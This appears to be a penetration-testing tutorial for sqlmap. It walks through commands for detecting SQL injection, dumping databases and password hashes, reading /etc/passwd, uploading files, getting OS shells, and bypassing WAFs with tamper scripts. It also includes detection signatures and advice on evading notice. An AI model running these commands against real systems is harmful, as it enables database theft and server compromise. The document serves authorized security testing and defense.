# sqlmap — full tutorial

`sqlmap` automates SQL injection detection and exploitation across MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite, and many more. It tries error-based, boolean-blind, time-blind, UNION, and stacked techniques per parameter, then can dump databases, read files, and (where the engine permits) get OS-level command execution.

## Install

```terminal
git clone --depth=1 https://github.com/sqlmapproject/sqlmap
cd sqlmap && python3 sqlmap.py --version

apt install sqlmap
brew install sqlmap
```

## Target specification

| Flag | Purpose |
|------|---------|
| `-u <url>` | URL with parameter to test |
| `-r <file>` | Saved raw HTTP request (Burp / `curl --trace-ascii`) |
| `-l <file>` | List of URLs (Burp logs) |
| `-m <file>` | Multiple targets file (one URL per line) |
| `-g <dork>` | Google dork → live URLs |
| `-c <config>` | INI config file |
| `-X <method>` | HTTP method override |
| `-d <connstring>` | Direct DB connection (e.g. `mysql://user:pass@host:3306/db`) |

## Specifying where to inject

| Flag | Purpose |
|------|---------|
| `-p <param>` | Test only these params (comma list) |
| `--skip <param>` | Skip these params |
| `--data <body>` | POST body (`a=1&b=FUZZ`) |
| `--cookie <c>` | Cookies (also tested) |
| `--user-agent <ua>` | UA header (also tested) |
| `--headers "X: Y"` | Extra headers (use `\n` to separate) |
| `--auth-type basic|digest|ntlm|pki` | Auth type |
| `--auth-cred user:pass` | Auth credentials |
| `--proxy http://127.0.0.1:8080` | Proxy through Burp |
| `--tor` / `--tor-type SOCKS5` | Route through Tor |
| `--random-agent` | Pick a random UA |
| `--ignore-code 404` | Don't treat code as failure |
| `--csrf-token <name>` / `--csrf-url <url>` | Auto-handle CSRF |
| `--force-ssl` | Force https even if URL says http |
| `-s <session>` | Resume previous session |

## Detection knobs

| Flag | Purpose |
|------|---------|
| `--level 1..5` | Test depth: cookie, headers, etc. (default 1) |
| `--risk 1..3` | Aggressiveness — risk 3 includes UPDATEs (potential data damage) |
| `--technique BEUSTQ` | Limit to: B(boolean) E(error) U(union) S(stacked) T(time) Q(inline) |
| `--prefix` / `--suffix` | Manual injection prefix/suffix wrapping |
| `--dbms <name>` | Skip detection if you know the DB |
| `--os <name>` | Same for OS |
| `--time-sec <int>` | Time-based delay seconds (default 5) |
| `--union-cols <range>` | Number of UNION columns to test |
| `--tamper <scripts>` | Apply payload-mangler scripts to bypass WAFs |
| `--threads <n>` | Concurrent requests for blind extractions |

`--level` cranks more places to inject (level 5 tests cookies, UA, Referer). `--risk 3` enables OR-based and time-based techniques that may modify data (use only on lab / authorized).

## Extraction (after detection)

| Flag | Effect |
|------|--------|
| `--current-user` | Current DB user |
| `--current-db` | Current DB name |
| `--hostname` | DB server hostname |
| `--is-dba` | Is DBA / sa? |
| `--users` | List DB users |
| `--passwords` | Hash dump |
| `--privileges` | Per-user privileges |
| `--dbs` | All databases |
| `-D <db>` | Pick a database |
| `--tables` | Tables in that DB |
| `-T <table>` | Pick a table |
| `--columns` | Columns of the table |
| `-C col1,col2` | Pick specific columns |
| `--dump` | Dump rows |
| `--dump-all` | Dump every accessible DB |
| `--exclude-sysdbs` | Skip default system DBs |
| `--start <n>` / `--stop <n>` | Row range |
| `--where "id < 10"` | Filter dump |
| `--search` | Search across schema for columns/tables |

## OS-level

| Flag | Effect |
|------|--------|
| `--os-shell` | Get an OS shell via SQLi (where engine perms allow) |
| `--os-pwn` | Meterpreter / VNC payload |
| `--os-cmd "id"` | Run a single OS command |
| `--file-read "/etc/passwd"` | Read a file from DB host |
| `--file-write local --file-dest /var/www/html/x.php` | Upload via SQL |
| `--reg-read` / `--reg-add` (Windows) | Registry ops |
| `--sql-shell` | Interactive SQL prompt |
| `--sql-query "SELECT 1"` | One-off query |

## Workflow

### 1. Detect

```terminal
sqlmap -u "https://target.com/item?id=1" --batch --random-agent --level 5 --risk 2
```

`--batch` answers all prompts with defaults (good for scripting).

### 2. Scope to the parameter that worked

```terminal
sqlmap -u "..." --batch -p id --dbms mysql
```

### 3. Map the schema

```terminal
sqlmap -u "..." --batch -p id --dbs
sqlmap -u "..." --batch -p id -D appdb --tables
sqlmap -u "..." --batch -p id -D appdb -T users --columns
sqlmap -u "..." --batch -p id -D appdb -T users --dump
```

### 4. From a Burp request file (most realistic)

```terminal
sqlmap -r request.txt --batch --level 3 --risk 2 --dbs
```

Burp → right-click request → Copy to file → save as `request.txt`. Mark the param to fuzz with `*` if needed (`id=1*&...`).

### 5. WAF bypass with tamper

```terminal
sqlmap -u "..." --batch \
  --tamper space2comment,between,charunicodeencode,modsecurityzeroversioned \
  --random-agent --delay 1
```

Hundreds of tampers: `python3 sqlmap.py --list-tampers`. Common picks:

- `space2comment` — `' OR 1=1--` → `'/**/OR/**/1=1--`
- `between` — convert `=` to `BETWEEN`/`AND`
- `charunicodeencode` — encode payload chars
- `modsecurityzeroversioned` — `/*!00000UNION*/` MySQL trick

## Good output

```
[*] starting sqlmap...
[INFO] testing connection to the target URL
[INFO] testing if the target URL is stable
[INFO] target URL is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[INFO] testing for SQL injection on GET parameter 'id'
...
[INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

available databases [4]:
[*] appdb
[*] information_schema
[*] mysql
[*] performance_schema
```

The "injectable" line is your finding. Time-based on its own with no error/UNION often indicates the WAF is partially blocking you — verify the bug exists.

## Bad output and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| `[CRITICAL] all tested parameters do not appear to be injectable` | Wrong injection point or filtered | Increase `--level`; try `--prefix`, `--suffix`; verify manually with Repeater |
| Many `connection timed out` | Server slow / WAF blocking | Add `--delay 2`, `--retries 3`, lower threads |
| Tool reports false positive | Heuristic noise | Use `--technique B` only and confirm; or use Burp Repeater manually |
| `unable to retrieve schema` after detection | Found bug but extraction probes blocked | Different `--technique` flag (e.g., switch from time- to UNION-based) |
| Random rows on dump | `--start`/`--stop` not set on huge tables | Pre-paginate and dump in batches |
| `os-shell` fails on MySQL | Privileges insufficient (`FILE` priv missing) | Verify with `--current-user --is-dba`; many shared hosts deny FILE |

## Defender's perspective

Telemetry gives plenty of signal:

- Repeated identical URLs with marginally different parameter values.
- Payload markers in WAF: `0x6f7265` (hex 'or'), `(SELECT(0)FROM(SELECT(SLEEP(`, `UNION/**/SELECT/**/NULL`, `BENCHMARK(5000000`.
- User-Agent: `sqlmap/<version>` (default — change with `--random-agent`).
- Time-based scans cause noticeable backend latency spikes.

Detection ideas:

- WAF rule on `sqlmap` UA + payload signatures.
- DB query latency anomaly: many queries with `SLEEP(5)` or `WAITFOR DELAY` patterns.
- Application logs: same URL with steadily-mutating param values from one IP.

## OPSEC notes

- Default UA = banner. Always `--random-agent` or set `--user-agent`.
- Time-based extraction is **slow and noisy** — every character takes ~5s; one column can take an hour. Use UNION when possible.
- Engagement scope must explicitly include data dumping; some scopes allow detection only.
- `--os-shell` modifies the target (writes a temp UDF / file). Get explicit authorization.
- Save `--session-file` for reproducibility; sqlmap can resume.

## Related tools

| Tool | Niche |
|------|-------|
| Manual via Burp Repeater | When sqlmap can't detect — add `'`, observe diff |
| `NoSQLMap` | NoSQL (Mongo) injection |
| `commix` | Command-injection equivalent |
| `tplmap` | Server-side template injection |
| `ghauri` | Faster sqlmap-style alternative (newer) |
| `xsstrike` | XSS analogue with similar feel |
